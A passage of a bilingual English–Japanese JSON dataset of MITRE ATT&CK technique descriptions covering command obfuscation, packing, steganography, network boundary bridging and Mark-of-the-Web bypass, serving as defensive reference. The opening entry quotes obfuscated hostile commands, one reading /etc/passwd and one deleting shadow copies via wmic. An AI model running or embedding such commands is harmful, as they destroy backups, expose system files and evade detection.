WMIC)\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)",
                        "description_jp": "攻撃者は、検出を妨げるためにコマンド実行中にコンテンツを難読化する可能性があります。コマンドライン難読化は、コマンドやスクリプト内の文字列やパターンを署名付けや分析を困難にする手法です。このタイプの難読化は、配信されたペイロード（例：[フィッシング](https://attack.mitre.org/techniques/T1566)や[ドライブバイコンプロマイズ](https://attack.mitre.org/techniques/T1189)）によって実行されるコマンドや、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して対話的に実行されるコマンドに含めることができます。(引用: Akamai JS)(引用: Malware Monday VBE)\n\n例えば、攻撃者は、スペース、<code>^</code>、<code>+</code>、<code>$</code>、<code>%</code>などのさまざまな記号やエスケープ文字を利用する構文を悪用して、同じ意図した機能を維持しながらコマンドを分析困難にする可能性があります。(引用: RC PowerShell) 多くの言語は、Base64やURLエンコーディングの形で組み込みの難読化をサポートしています。(引用: Microsoft PowerShellB64) 攻撃者はまた、文字列分割（<code>“Wor”+“d.Application”</code>）、文字の順序と大文字小文字の区別（<code>rev <<<'dwssap/cte/ tac'</code>）、グロビング（<code>mkdir -p '/tmp/:&$NiA'</code>）、およびトークン/環境変数/入力ストリームを介して文字列を渡すさまざまなトリックを介してコマンド難読化を手動で実装する可能性があります。(引用: Bashfuscator Command Obfuscators)(引用: FireEye Obfuscation June 2017)\n\n攻撃者はまた、コマンドによって呼び出されるバイナリへの参照を難読化するために、ディレクトリトラバーサルのようなトリックを使用するかもしれません(<code>C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete</code>)。(引用：Twitter Richard WMIC）\n\n<code>Invoke-Obfuscation</code>や<code>Invoke-DOSfucation</code>などのツールも、コマンドを難読化するために使用されています。(引用: Invoke-DOSfuscation)(引用: Invoke-Obfuscation)"
                    },
                    {
                        "id": "T1027.004",
                        "name_eng": "Compile After Delivery",
                        "name_jp": "配信後のコンパイル",
                        "description_eng": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)",
                        "description_jp": "攻撃者は、コンパイルされていないコードとしてファイルを被害者に配信することにより、ペイロードの発見と分析を困難にしようとする可能性があります。テキストベースのソースコードファイルは、実行可能ファイル/バイナリを標的とする保護からの分析と精査を破壊する可能性があります。これらのペイロードは、実行前にコンパイルする必要があります。通常、ilasm.exe(引用: ATTACK IQ)、csc.exe、またはGCC/MinGWなどのネイティブユーティリティを介して行われます。(引用: ClearSky MuddyWater Nov 2018)\n\nソースコードペイロードはまた、[フィッシング](https://attack.mitre.org/techniques/T1566)として配信されるものなど、他のファイル内に暗号化、エンコード、および/または埋め込まれる場合があります。ペイロードはまた、バンドルされたコンパイラと実行フレームワークで後で適切な実行可能バイナリに（再）コンパイルされる前に、ネイティブOSにとって認識できず本質的に良性の形式（例：macOS/Linux上のEXE）で配信される場合もあります。(引用: TrendMicro WindowsAppMac)"
                    },
                    {
                        "id": "T1027.007",
                        "name_eng": "Dynamic API Resolution",
                        "name_jp": "動的API解決",
                        "description_eng": "Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various [Native API](https://attack.mitre.org/techniques/T1106) functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.\n\nAPI functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.(Citation: Huntress API Hash)(Citation: IRED API Hashing)\n\nTo avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to [Software Packing](https://attack.mitre.org/techniques/T1027/002), dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.\n\nVarious methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) during execution).(Citation: BlackHat API Packers)(Citation: Drakonia HInvoke)(Citation: Huntress API Hash)",
                        "description_jp": "攻撃者は、マルウェアによって呼び出されるAPI関数を難読化してから動的に解決し、悪意のある機能を隠蔽し、防御分析を妨害する可能性があります。マルウェアは一般的に、プロセス、ファイル、その他のシステムアーティファクトに関連するものなど、さまざまなタスクを実行するためにOSによって提供されるさまざまな[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数を使用します。\n\nマルウェアによって呼び出されるAPI関数は、ペイロードファイル内の文字列などの静的アーティファクトを残す可能性があります。防御アナリストはまた、インポートアドレステーブル（IAT）や、呼び出しコードを関数を提供する共有モジュールに動的にリンクするのに役立つその他の構造を介して、バイナリファイルが実行する可能性のある関数を明らかにすることができます。(引用: Huntress API Hash)(引用: IRED API Hashing)\n\n静的またはその他の防御分析を回避するために、攻撃者は動的API解決を使用して、マルウェアの特性と機能を隠蔽する可能性があります。[ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002)と同様に、動的API解決は、実行時に解決されて呼び出されるまで、ファイル署名を変更し、悪意のあるAPI関数呼び出しを難読化する可能性があります。\n\nマルウェアのAPI関数呼び出しを難読化するために、さまざまな方法が使用される場合があります。例えば、関数名のハッシュは、リテラル文字列の代わりにマルウェアによく保存されます。マルウェアはこれらのハッシュ（またはその他の識別子）を使用して、<code>GetProcAddress()</code>や<code>LoadLibrary()</code>などの関数を使用して、リンクおよびロードプロセスを手動で再現できます。これらのハッシュ/識別子は、暗号化やその他の文字列操作トリックを使用してさらに難読化することもできます（実行中にさまざまな形式の[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)が必要です）。(引用: BlackHat API Packers)(引用: Drakonia HInvoke)(引用: Huntress API Hash)"
                    },
                    {
                        "id": "T1027.003",
                        "name_eng": "Steganography",
                        "name_jp": "ステガノグラフィ",
                        "description_eng": "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\n[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) \n\nBy the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)",
                        "description_jp": "攻撃者は、隠された情報の検出を防ぐためにステガノグラフィ技術を使用する可能性があります。ステガノグラフィ技術は、画像、オーディオトラック、ビデオクリップ、またはテキストファイルなどのデジタルメディアにデータを隠すために使用できます。\n\n[Duqu](https://attack.mitre.org/software/S0038)は、ステガノグラフィを使用したマルウェアの初期の例でした。被害者のシステムから収集した情報を暗号化し、C2サーバーに画像を抜き出す前に画像内に隠しました。(引用: Wikipedia Duqu)\n\n2017年末までに、ある脅威グループが<code>Invoke-PSImage</code>を使用して[PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドを画像ファイル（.png）に隠し、被害者のシステムでコードを実行しました。この特定のケースでは、[PowerShell](https://attack.mitre.org/techniques/T1059/001)コードは別の難読化されたスクリプトをダウンロードして被害者のマシンから情報を収集し、それを攻撃者に送り返しました。(引用: McAfee Malicious Doc Targets Pyeongchang Olympics)"
                    },
                    {
                        "id": "T1027.015",
                        "name_eng": "Compression",
                        "name_jp": "圧縮",
                        "description_eng": "Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e., [Fileless Storage](https://attack.mitre.org/techniques/T1027/011)).(Citation: Trustwave Pillowmint June 2020)\n\nIn order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated ZIP files and miss the presence of the malicious payload.(Citation: Perception Point)\n\nFile archives may be sent as one [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) through email. Adversaries have sent malicious payloads as archived files to encourage the user to interact with and extract the malicious payload onto their system (i.e., [Malicious File](https://attack.mitre.org/techniques/T1204/002)).(Citation: NTT Security Flagpro new December 2021) However, some file compression tools, such as 7zip, can be used to produce self-extracting archives. Adversaries may send self-extracting archives to hide the functionality of their payload and launch it without requiring multiple actions from the user.(Citation: The Hacker News)\n\n[Compression](https://attack.mitre.org/techniques/T1027/015) may be used in combination with [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013) where compressed files are encrypted and password-protected.",
                        "description_jp": "攻撃者は圧縮を使用してペイロードやファイルを難読化する可能性があります。ZIP、gzip、7z、RARなどの圧縮ファイル形式は、複数のファイルをまとめて圧縮およびアーカイブして、ファイルの転送をより簡単かつ高速にすることができます。ファイルの圧縮に加えて、攻撃者はシェルコードを直接圧縮することもあります。例えば、Windowsレジストリキーに保存するためなどです（つまり、[ファイルレスストレージ](https://attack.mitre.org/techniques/T1027/011)）。(引用: Trustwave Pillowmint June 2020)\n\n検出をさらに回避するために、攻撃者は複数のZIPファイルを1つのアーカイブに結合する場合があります。この連結プロセスにより、単一のアーカイブのように見えるアーカイブが作成されますが、実際には埋め込みアーカイブの中央ディレクトリが含まれています。7zipなどの一部のZIPリーダーは、連結されたZIPファイルを識別できず、悪意のあるペイロードの存在を見逃す可能性があります。(引用: Perception Point)\n\nファイルアーカイブは、電子メールを介して1つの[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)として送信される場合があります。攻撃者は、ユーザーが悪意のあるペイロードと対話し、システムに抽出するように促すために、アーカイブファイルとして悪意のあるペイロードを送信しています（つまり、[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002)）。(引用: NTT Security Flagpro new December 2021) ただし、7zipなどの一部のファイル圧縮ツールは、自己解凍アーカイブを作成するために使用できます。攻撃者は、ペイロードの機能を隠し、ユーザーからの複数のアクションを必要とせずに起動するために、自己解凍アーカイブを送信する場合があります。(引用: The Hacker News)\n\n[圧縮](https://attack.mitre.org/techniques/T1027/015)は、圧縮ファイルが暗号化されパスワードで保護されている[暗号化/エンコードされたファイル](https://attack.mitre.org/techniques/T1027/013)と組み合わせて使用される場合があります。"
                    },
                    {
                        "id": "T1027.016",
                        "name_eng": "Junk Code Insertion",
                        "name_jp": "ジャンクコード挿入",
                        "description_eng": "Adversaries may use junk code / dead code to obfuscate a malware’s functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined with [Compression](https://attack.mitre.org/techniques/T1027/015) or [Software Packing](https://attack.mitre.org/techniques/T1027/002).(Citation: ReasonLabs)(Citation: ReasonLabs Cyberpedia Junk Code)\n\nNo-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly language. They are commonly used as the 0x90 opcode. When NOPs are added to malware, the disassembler may show the NOP instructions, leading to the analyst needing to step through them.(Citation: ReasonLabs)\n\nThe use of junk / dead code insertion is distinct from [Binary Padding](https://attack.mitre.org/techniques/T1027/001) because the purpose is to obfuscate the functionality of the code, rather than simply to change the malware’s signature.",
                        "description_jp": "攻撃者は、マルウェアの機能を難読化するためにジャンクコード/デッドコードを使用する可能性があります。ジャンクコードは、実行されないコード、または実行されてもコードの機能を変えないコードです。ジャンクコードは、アナリストが主要なコードを分析する代わりに機能しないコードをステップ実行する必要があるため、分析をより困難にし、時間のかかるものにします。また、特に[圧縮](https://attack.mitre.org/techniques/T1027/015)や[ソフトウェアパッキング](https://attack.mitre.org/techniques/T1027/002)と組み合わせた場合、良性の機能の使用により静的コード分析に依存する検出を妨げる可能性もあります。(引用: ReasonLabs)(引用: ReasonLabs Cyberpedia Junk Code)\n\nNo-Operation (NOP) 命令は、x86アセンブリ言語で一般的に使用されるデッドコードの一例です。これらは一般的に0x90オペコードとして使用されます。NOPがマルウェアに追加されると、逆アセンブラはNOP命令を表示し、アナリストがそれらをステップ実行する必要が生じます。(引用: ReasonLabs)\n\nジャンク/デッドコード挿入の使用は、マルウェアの署名単に変更するのではなく、コードの機能を難読化することを目的としているため、[バイナリパディング](https://attack.mitre.org/techniques/T1027/001)とは異なります。"
                    },
                    {
                        "id": "T1027.008",
                        "name_eng": "Stripped Payloads",
                        "name_jp": "除去済みペイロード",
                        "description_eng": "Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s `linker` when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018)\n\nAdversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002), to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.(Citation: SentinelLabs reversing run-only applescripts 2021)",
                        "description_jp": "攻撃者は、シンボル、文字列、およびその他の人間が読める情報を削除することにより、ペイロードの分析を困難にしようとする可能性があります。スクリプトや実行可能ファイルには、開発者がコードの機能を文書化するのに役立つ変数名やその他の文字列が含まれている場合があります。シンボルは、実行可能ペイロードがコンパイルされるときに、オペレーティングシステムの`リンカ`によって作成されることがよくあります。リバースエンジニアは、これらのシンボルや文字列を使用してコードを分析し、ペイロードの機能を特定します。(引用: Mandiant golang stripped binaries explanation)(引用: intezer stripped binaries elf files 2018)\n\n攻撃者は、マルウェア分析をより困難にするために、除去済みペイロードを使用する可能性があります。例えば、コンパイラやその他のツールは、文字列やシンボルを削除または難読化する機能を提供する場合があります。攻撃者はまた、実行専用AppleScript（[AppleScript](https://attack.mitre.org/techniques/T1059/002)のコンパイル済みおよび除去済みバージョン）など、除去済みペイロード形式を使用して、検出と分析を回避しています。人間が読める情報がないため、ペイロードの検出と分析が直接妨げられる可能性があります。(引用: SentinelLabs reversing run-only applescripts 2021)"
                    },
                    {
                        "id": "T1027.002",
                        "name_eng": "Software Packing",
                        "name_jp": "ソフトウェアパッキング",
                        "description_eng": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)",
                        "description_jp": "攻撃者は、コードを隠蔽するためにソフトウェアパッキングまたは仮想マシンソフトウェア保護を実行する可能性があります。ソフトウェアパッキングは、実行可能ファイルを圧縮または暗号化する方法です。実行可能ファイルをパッキングすると、署名ベースの検出を回避するためにファイル署名が変更されます。ほとんどの解凍技術は、メモリ内で実行可能コードを解凍します。仮想マシンソフトウェア保護は、実行可能ファイルの元のコードを、特別な仮想マシンのみが実行できる特別な形式に変換します。その後、仮想マシンが呼び出されてこのコードを実行します。(引用: ESET FinFisher Jan 2018)\n\nソフトウェアパッキングを実行するために使用されるユーティリティは、パッカーと呼ばれます。パッカーの例としては、MPRESSやUPXがあります。既知のパッカーのより包括的なリストが利用可能ですが、攻撃者は防御を回避するために、既知のパッカーと同じアーティファクトを残さない独自のパッキング技術を作成する可能性があります。(引用: Awesome Executable Packing)"
                    },
                    {
                        "id": "T1027.001",
                        "name_eng": "Binary Padding",
                        "name_jp": "バイナリパディング",
                        "description_eng": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ)",
                        "description_jp": "攻撃者はバイナリパディングを使用してジャンクデータを追加し、マルウェアのディスク上の表現を変更する可能性があります。これは、バイナリの機能や動作に影響を与えることなく行うことができますが、ファイルサイズの制限により一部のセキュリティツールが処理できる範囲を超えてバイナリのサイズを大きくする可能性があります。\n\nバイナリパディングは、ファイルのチェックサムを効果的に変更し、ハッシュベースのブロックリストや静的ウイルス対策署名を回避するためにも使用できます。(引用: ESET OceanLotus) 使用されるパディングは、通常、ジャンクデータを作成する関数によって生成され、マルウェアの末尾に追加されるか、セクションに適用されます。(引用: Securelist Malware Tricks April 2017) ファイルサイズを大きくすると、大きなファイルをスキャンするように設計または構成されていない特定のツールや検出機能の有効性が低下する可能性があります。これにより、分析のために収集される可能性も低くなります。VirusTotalなどのパブリックファイルスキャンサービスは、分析対象としてアップロードされるファイルの最大サイズを制限しています。(引用: VirusTotal FAQ)"
                    }
                ]
            },
            {
                "id": "T1599",
                "name_eng": "Network Boundary Bridging",
                "name_jp": "ネットワーク境界ブリッジング",
                "description_eng": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
                "description_jp": "攻撃者は、境界ネットワークデバイスまたはネットワークセグメンテーションを担当する内部デバイスを侵害することにより、ネットワーク境界をブリッジする可能性があります。これらのデバイスを侵害すると、攻撃者は、信頼できるネットワークと信頼できないネットワークを分離するトラフィックルーティングの制限をバイパスできる可能性があります。\n\nルーターやファイアウォールなどのデバイスを使用して、信頼できるネットワークと信頼できないネットワークの間に境界を作成できます。これらは、IPアドレス、レイヤー4プロトコルポートを禁止したり、ディープパケットインスペクションを介してアプリケーションを識別したりすることにより、トラフィックタイプを制限して、そのような接続に固有のリスクを軽減しようとする組織ポリシーを施行することで実現します。ネットワークの他の部分に参加するために、これらのデバイスは直接アドレス指定可能または透過的にすることができますが、それらの動作モードは、侵害されたときに攻撃者がそれらをバイパスする方法には影響しません。\n\n攻撃者がそのような境界デバイスを制御すると、そのポリシー施行をバイパスして、通常禁止されているトラフィックを2つの分離されたネットワーク間の信頼境界を越えて妨害なく通過させることができます。デバイス上で十分な権限を取得することにより、攻撃者はデバイスを再構成して目的のトラフィックを許可し、その後、[マルチホッププロキシ](https://attack.mitre.org/techniques/T1090/003)を介したコマンドアンドコントロールや[トラフィック複製](https://attack.mitre.org/techniques/T1020/001)を介したデータの持ち出しなどの目標をさらに達成できます。攻撃者はまた、ネットワークセグメンテーションを担当する内部デバイスを標的にし、これらを[内部プロキシ](https://attack.mitre.org/techniques/T1090/001)と組み合わせて悪用して同じ目標を達成する可能性があります。(引用: Kaspersky ThreatNeedle Feb 2021) 境界デバイスが2つの別々の組織を分離する場合、攻撃者は新しい被害者環境への横方向の移動も容易にすることができます。",
                "subtechniques": [
                    {
                        "id": "T1599.001",
                        "name_eng": "Network Address Translation Traversal",
                        "name_jp": "ネットワークアドレス変換トラバーサル",
                        "description_eng": "Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)\n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  \n\nAdversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",
                        "description_jp": "攻撃者は、ネットワークデバイスのネットワークアドレス変換（NAT）構成を変更することにより、ネットワーク境界をブリッジする可能性があります。NATへの悪意のある変更により、攻撃者は、信頼できるネットワークと信頼できないネットワークを分離するトラフィックルーティングの制限をバイパスできる可能性があります。\n\n複数のネットワークを接続するルーターやファイアウォールなどのネットワークデバイスは、ネットワーク間でパケットを渡すプロセス中にNATを実装する場合があります。NATを実行する場合、ネットワークデバイスはIPアドレスヘッダーの送信元アドレスおよび/または宛先アドレスを書き換えます。一部のネットワーク設計では、パケットが境界デバイスを通過するためにNATが必要です。これの典型的な例は、内部ネットワークがインターネットルーティング不可能なアドレスを利用する環境です。(引用: RFC1918)\n\n攻撃者がネットワーク境界デバイスを制御すると、既存のNAT構成を利用して2つの分離されたネットワーク間でトラフィックを送信したり、独自の設計のNAT構成を実装したりできます。NATが機能するために必要なネットワーク設計の場合、これにより攻撃者は、通常、境界デバイスの背後にある保護されたシステムへのアクセスを防ぐ固有のルーティング制限を克服できます。NATを必要としないネットワーク設計の場合、ネットワーク境界デバイスを通過するパケットのアドレスを変更すると、防御側にとってデータ送信の監視がより困難になるため、攻撃者はNATを使用してアクティビティを隠蔽できます。\n\n攻撃者は[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を使用してネットワークデバイスのオペレーティングシステムを変更し、アクティビティをさらに隠蔽するために独自のカスタムNATメカニズムを実装する場合があります。"
                    }
                ]
            },
            {
                "id": "T1553",
                "name_eng": "Subvert Trust Controls",
                "name_jp": "信頼制御の破壊",
                "description_eng": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\n\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates)",
                "description_jp": "攻撃者は、信頼できないアクティビティについてユーザーに警告したり、信頼できないプログラムの実行を防いだりするセキュリティ制御を弱体化させる可能性があります。オペレーティングシステムやセキュリティ製品には、プログラムやWebサイトがある程度の信頼レベルを持っていると識別するメカニズムが含まれている場合があります。このような機能の例としては、有効なコード署名証明書によって署名されているためにプログラムの実行が許可されること、インターネットからダウンロードされた属性セットを持っているためにプログラムがユーザーに警告を表示すること、または信頼できないサイトに接続しようとしていることを示す表示が表示されることなどがあります。\n\n攻撃者はこれらの信頼メカニズムを破壊しようとする可能性があります。攻撃者が使用する方法は、破壊しようとする特定のメカニズムによって異なります。攻撃者は、これらの制御を破壊することを支援するために、[ファイルおよびディレクトリのアクセス許可の変更](https://attack.mitre.org/techniques/T1222)または[レジストリの変更](https://attack.mitre.org/techniques/T1112)を実行する可能性があります。(引用: SpectorOps Subverting Trust Sept 2017) 攻撃者はまた、ターゲットシステム上で信頼を得るためにコード署名証明書を作成または盗む可能性もあります。(引用: Securelist Digital Certificates)(引用: Symantec Digital Certificates)",
                "subtechniques": [
                    {
                        "id": "T1553.005",
                        "name_eng": "Mark-of-the-Web Bypass",
                        "name_jp": "Mark-of-the-Webバイパス",
                        "description_eng": "Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)",
                        "description_jp": "攻撃者は、特定のファイル形式を悪用して、Mark-of-the-Web（MOTW）制御を破壊する可能性があります。Windowsでは、インターネットからファイルがダウンロードされると、MOTWとして知られる特定の値を持つ<code>Zone.Identifier</code>という名前の非表示のNTFS代替データストリーム（ADS）でタグ付けされます。(引用: Microsoft Zone.Identifier 2020) MOTWでタグ付けされたファイルは保護され、特定の操作を実行できません。例えば、MS Office 10以降では、MS OfficeファイルにMOTWがある場合、保護ビューで開きます。MOTWでタグ付けされた実行可能ファイルは、Windows Defender SmartScreenによって処理され、ファイルが既知の実行可能ファイルの許可リストと比較されます。ファイルが不明/信頼できない場合、SmartScreenは実行を防ぎ、実行しないようにユーザーに警告します。(引用: Beek Use of VHD Dec 2020)(引用: Outflank MotW 2020)(引用: Intezer Russian APT Dec 2020)\n\n攻撃者は、圧縮/アーカイブ（.arj、.gzip）やディスクイメージ（.iso、.vhd）ファイル形式などのコンテナファイルを悪用して、MOTWでタグ付けされない可能性のある悪意のあるペイロードを配信する可能性があります。インターネットからダウンロードされたコンテナファイルはMOTWでマークされますが、コンテナファイルが抽出および/またはマウントされた後、内部のファイルはMOTWを継承しない場合があります。MOTWはNTFSの機能であり、多くのコンテナファイルはNTFS代替データストリームをサポートしていません。コンテナファイルが抽出および/またはマウントされた後、内部のファイルはディスク上のローカルファイルとして扱われ、保護なしで実行される場合があります。(引用: Beek Use of VHD Dec 2020)(引用: Outflank MotW 2020)"
                    },
                    {
                        "id": "T1553.002",
                        "name_eng": "Code Signing",
                        "name_jp": "コード署名",
                        "description_eng": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
